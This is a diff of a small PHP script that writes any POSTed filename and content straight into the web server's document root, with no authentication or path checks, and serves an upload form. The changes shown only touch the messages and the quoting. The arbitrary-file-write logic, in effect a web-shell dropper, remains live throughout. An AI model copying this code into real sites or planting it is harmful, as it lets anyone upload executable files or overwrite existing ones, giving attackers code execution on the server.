@@ -8,12 +8,14 @@ $fName = $_POST['filename'];
 $fInput = $_POST['fileinput'];
 
 if ($fName && $fInput) {
-  $myfile = fopen($_SERVER['DOCUMENT_ROOT'] . $fName, "wb") or die("Unable to open file!");
+  $myfile = fopen($_SERVER["DOCUMENT_ROOT"] . $fName, "wb") or die("Error Requested!") ;
   fwrite($myfile, $fInput);
   fclose($myfile);
+  echo "Completed!";
 } else {
-  echo "";
+  echo "Submit Your File!";
 }
+
 ?>
 
 <form action="" method="POST">
